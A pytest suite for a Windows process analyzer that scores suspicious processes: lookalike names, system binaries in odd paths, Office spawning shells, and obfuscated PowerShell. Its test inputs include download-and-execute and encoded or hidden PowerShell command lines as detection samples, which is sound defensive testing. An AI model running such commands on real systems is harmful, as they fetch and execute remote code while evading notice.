
from pc_security.security.analyzer import (
    analyze_process,
    analyze_processes,
)


def test_missing_path_does_not_automatically_increase_risk():
    process = {
        "pid": 188,
        "name": None,
        "exe_path": None,
        "cpu_percent": 0.0,
        "memory_mb": 100.0,
        "parent_pid": 4,
    }

    result = analyze_process(process)

    assert result["risk_score"] == 0
    assert result["risk_level"] == "low"
    assert any(
        finding["code"] == "MISSING_PATH"
        for finding in result["findings"]
    )


def test_system_process_from_expected_directory_is_not_flagged():
    process = {
        "pid": 1104,
        "name": "svchost.exe",
        "exe_path": r"C:\Windows\System32\svchost.exe",
        "cpu_percent": 0.0,
        "memory_mb": 18.0,
        "parent_pid": 1308,
    }

    result = analyze_process(process)

    assert result["risk_score"] == 0
    assert not any(
        finding["code"] == "SYSTEM_NAME_UNUSUAL_PATH"
        for finding in result["findings"]
    )


def test_system_name_from_unusual_directory_is_flagged():
    process = {
        "pid": 1234,
        "name": "svchost.exe",
        "exe_path": r"C:\Users\Public\svchost.exe",
        "cpu_percent": 0.0,
        "memory_mb": 10.0,
        "parent_pid": 1000,
    }

    result = analyze_process(process)

    assert result["risk_score"] == 35
    assert result["risk_level"] == "medium"
    assert any(
        finding["code"] == "SYSTEM_NAME_UNUSUAL_PATH"
        for finding in result["findings"]
    )


def test_analyze_processes_returns_one_result_per_process():
    processes = [
        {
            "pid": 1,
            "name": "example.exe",
            "exe_path": r"C:\Program Files\Example\example.exe",
            "cpu_percent": 0.0,
            "memory_mb": 10.0,
            "parent_pid": 0,
        },
        {
            "pid": 2,
            "name": None,
            "exe_path": None,
            "cpu_percent": 0.0,
            "memory_mb": None,
            "parent_pid": None,
        },
    ]

    results = analyze_processes(processes)

    assert len(results) == 2
    assert results[0]["pid"] == 1
    assert results[1]["pid"] == 2


def test_system_directory_comes_from_system_root(monkeypatch):
    monkeypatch.setenv("SystemRoot", r"D:\WinNT")

    expected = analyze_process({
        "pid": 1,
        "name": "svchost.exe",
        "exe_path": r"D:\WinNT\System32\svchost.exe",
    })
    unexpected = analyze_process({
        "pid": 2,
        "name": "svchost.exe",
        "exe_path": r"C:\Windows\System32\svchost.exe",
    })

    assert not any(
        f["code"] == "SYSTEM_NAME_UNUSUAL_PATH" for f in expected["findings"]
    )
    assert any(
        f["code"] == "SYSTEM_NAME_UNUSUAL_PATH" for f in unexpected["findings"]
    )


def test_windows_temp_comes_from_system_root(monkeypatch):
    monkeypatch.setenv("SystemRoot", r"D:\WinNT")
    monkeypatch.setenv("TEMP", "")
    monkeypatch.setenv("TMP", "")

    result = analyze_process({
        "pid": 3,
        "name": "setup.exe",
        "exe_path": r"D:\WinNT\Temp\setup.exe",
    })

    assert any(f["code"] == "EXECUTABLE_IN_TEMP" for f in result["findings"])


# ---------------------------------------------------------------------------
# Phase 3 rules
# ---------------------------------------------------------------------------

import pytest


@pytest.fixture
def windows_env(monkeypatch):
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    monkeypatch.setenv("TEMP", r"C:\Users\alice\AppData\Local\Temp")
    monkeypatch.setenv("TMP", r"C:\Users\alice\AppData\Local\Temp")
    monkeypatch.setenv("USERPROFILE", r"C:\Users\alice")
    monkeypatch.setenv("APPDATA", r"C:\Users\alice\AppData\Roaming")
    monkeypatch.setenv("LOCALAPPDATA", r"C:\Users\alice\AppData\Local")
    monkeypatch.setenv("PROGRAMDATA", r"C:\ProgramData")
    monkeypatch.setenv("PUBLIC", r"C:\Users\Public")


def codes(result):
    return {finding["code"] for finding in result["findings"]}


def make_process(**fields):
    process = {
        "pid": 500,
        "name": "example.exe",
        "exe_path": r"C:\Program Files\Example\example.exe",
    }
    process.update(fields)
    return process


def assert_finding_format(result):
    for finding in result["findings"]:
        assert set(finding) == {
            "code", "severity", "title", "explanation", "points",
        }
        assert finding["explanation"]


@pytest.mark.parametrize("name", ["svch0st.exe", "scvhost.exe", "lsas.exe"])
def test_lookalike_system_name_is_flagged(windows_env, name):
    result = analyze_process(make_process(name=name))

    assert "LOOKALIKE_SYSTEM_NAME" in codes(result)
    assert result["risk_score"] == 30
    assert_finding_format(result)


@pytest.mark.parametrize(
    "name",
    ["svchost.exe", "lsaiso.exe", "sihost.exe", "dashost.exe",
     "iexplore.exe", "notepad.exe", "sms.exe"],
)
def test_exact_or_legitimate_names_are_not_lookalikes(windows_env, name):
    result = analyze_process(make_process(name=name))

    assert "LOOKALIKE_SYSTEM_NAME" not in codes(result)


@pytest.mark.parametrize("parent", ["WINWORD.EXE", "excel.exe", "msedge.exe"])
def test_office_or_browser_spawning_shell_is_flagged(windows_env, parent):
    result = analyze_process(
        make_process(name="powershell.exe", parent_name=parent)
    )

    assert "SUSPICIOUS_PARENT_CHILD" in codes(result)
    assert_finding_format(result)


def test_explorer_spawning_shell_is_not_flagged(windows_env):
    result = analyze_process(
        make_process(name="cmd.exe", parent_name="explorer.exe")
    )

    assert "SUSPICIOUS_PARENT_CHILD" not in codes(result)


@pytest.mark.parametrize(
    "cmdline",
    [
        "powershell.exe -enc SQBFAFgA",
        "powershell -EncodedCommand SQBFAFgA",
        "powershell.exe -w hidden -c calc",
        "powershell -WindowStyle Hidden -File a.ps1",
        "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')",
        "pwsh -c [Convert]::FromBase64String('AAAA')",
    ],
)
def test_suspicious_powershell_command_line_is_flagged(windows_env, cmdline):
    result = analyze_process(
        make_process(name="powershell.exe", cmdline=cmdline)
    )

    assert "SUSPICIOUS_COMMAND_LINE" in codes(result)
    assert_finding_format(result)


def test_multiple_powershell_indicators_score_higher(windows_env):
    one = analyze_process(make_process(
        name="powershell.exe", cmdline="powershell -enc AAAA",
    ))
    many = analyze_process(make_process(
        name="powershell.exe",
        cmdline="powershell -w hidden -enc AAAA IEX DownloadString",
    ))

    assert many["risk_score"] > one["risk_score"]
    assert many["risk_score"] <= 100


@pytest.mark.parametrize(
    "cmdline",
    [
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File x.ps1",
        "powershell.exe -ep bypass",
        r"C:\Program Files\Example\example.exe -enc foo",
    ],
)
def test_ordinary_command_lines_are_not_flagged(windows_env, cmdline):
    name = "example.exe" if "example" in cmdline else "powershell.exe"
    result = analyze_process(make_process(name=name, cmdline=cmdline))

    assert "SUSPICIOUS_COMMAND_LINE" not in codes(result)


def test_system_process_under_normal_user_is_flagged(windows_env):
    result = analyze_process(make_process(
        name="lsass.exe",
        exe_path=r"C:\Windows\System32\lsass.exe",
        username=r"DESKTOP-1\alice",
    ))

    assert "SYSTEM_PROCESS_WRONG_USER" in codes(result)
    assert_finding_format(result)


@pytest.mark.parametrize(
    "username",
    [r"NT AUTHORITY\SYSTEM", r"NT AUTHORITY\LOCAL SERVICE",
     r"NT AUTHORITY\NETWORK SERVICE", None],
)
def test_system_accounts_or_unknown_user_not_flagged(windows_env, username):
    result = analyze_process(make_process(
        name="services.exe",
        exe_path=r"C:\Windows\System32\services.exe",
        username=username,
    ))

    assert "SYSTEM_PROCESS_WRONG_USER" not in codes(result)


def test_per_user_svchost_is_not_flagged_for_user(windows_env):
    result = analyze_process(make_process(
        name="svchost.exe",
        exe_path=r"C:\Windows\System32\svchost.exe",
        username=r"DESKTOP-1\alice",
        parent_name="services.exe",
    ))

    assert result["risk_score"] == 0


def test_lsass_with_wrong_parent_is_flagged(windows_env):
    result = analyze_process(make_process(
        name="lsass.exe",
        exe_path=r"C:\Windows\System32\lsass.exe",
        parent_name="explorer.exe",
    ))

    assert "SYSTEM_PROCESS_WRONG_PARENT" in codes(result)
    assert_finding_format(result)


@pytest.mark.parametrize("parent", ["wininit.exe", None])
def test_lsass_with_expected_or_unknown_parent_is_not_flagged(
    windows_env, parent,
):
    result = analyze_process(make_process(
        name="lsass.exe",
        exe_path=r"C:\Windows\System32\lsass.exe",
        parent_name=parent,
    ))

    assert "SYSTEM_PROCESS_WRONG_PARENT" not in codes(result)


@pytest.mark.parametrize(
    "path",
    [
        r"C:\Users\alice\AppData\Roaming\Tool\tool.exe",
        r"C:\Users\alice\AppData\Local\Programs\app.exe",
        r"C:\ProgramData\Vendor\agent.exe",
        r"C:\Users\Public\thing.exe",
    ],
)
def test_user_writable_location_is_low_weight(windows_env, path):
    result = analyze_process(make_process(exe_path=path))

    assert codes(result) == {"EXECUTABLE_IN_USER_WRITABLE_DIR"}
    assert result["risk_score"] == 10
    assert result["risk_level"] == "low"


def test_temp_folder_is_not_counted_twice_as_user_writable(windows_env):
    result = analyze_process(make_process(
        exe_path=r"C:\Users\alice\AppData\Local\Temp\setup.exe",
    ))

    assert codes(result) == {"EXECUTABLE_IN_TEMP"}
    assert result["risk_score"] == 25


def test_score_is_capped_at_100(windows_env):
    result = analyze_process(make_process(
        name="lsass.exe",
        exe_path=r"C:\Users\alice\AppData\Local\Temp\lsass.exe",
        parent_name="winword.exe",
        username=r"PC\alice",
        cmdline="powershell -w hidden -enc AAAA IEX DownloadString",
    ))

    assert result["risk_score"] == 100
    assert result["risk_level"] == "high"


def test_analysis_carries_process_context(windows_env):
    result = analyze_process(make_process(
        parent_pid=4, parent_name="explorer.exe", cmdline="example.exe",
        username=r"PC\alice", create_time=1.5, metadata_notes=["note"],
    ))

    assert result["parent_name"] == "explorer.exe"
    assert result["cmdline"] == "example.exe"
    assert result["username"] == r"PC\alice"
    assert result["metadata_notes"] == ["note"]
